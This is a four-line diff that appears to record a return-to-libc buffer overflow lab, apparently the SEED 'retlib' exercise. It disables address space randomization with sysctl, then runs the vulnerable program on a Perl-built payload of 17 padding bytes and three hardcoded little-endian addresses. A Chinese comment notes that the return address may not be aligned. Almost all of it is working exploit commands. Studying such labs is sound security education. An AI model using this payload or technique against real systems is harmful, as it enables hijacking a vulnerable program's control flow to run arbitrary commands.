@@ -1,0 +1,4 @@
+sudo sysctl -w kernel.randomize_va_space=0
+ ./retlib `perl -e 'print "A" x 17 . "\xd0\x4c\xe5\xf7\xc0\x7e\xe4\xf7\xc5\xdf\xff\xff";'`
+
+RET地址不一定对齐
